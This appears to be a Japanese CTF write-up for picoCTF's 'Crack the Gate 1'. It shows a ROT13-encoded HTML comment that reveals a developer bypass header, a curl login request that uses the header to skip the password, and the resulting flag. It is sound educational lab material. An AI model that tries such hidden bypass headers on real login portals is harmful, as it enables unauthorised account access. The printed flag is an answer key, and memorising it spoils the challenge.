## Crack the Gate 1
### 問題文
```
We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?
Additional details will be available after launching your challenge instance.
```
### 解き方
1. Webサイトにアクセスし，Htmlを見るとコメントにABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"と書いてある
2. これをシーザー暗号で解読するとDecrypted text: NOTE: Jack - temporary bypass: use header X-Dev-Access: yesとなる
3. つまり，ヘッダーにX-Dev-Accessを付けてアクセスすればいい
```bash
$curl -X POST "http://amiable-citadel.picoctf.net:64453/login" -H "X-Dev-Access: yes" -H "Content-Type: application/json" -d '{"email":"ctf-player@picoctf.org"}'
```
4. {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_125f752d}"}このjsonが返ってくるので，ここからフラグを入手できる
5. フラグ picoCTF{brut4_f0rc4_125f752d}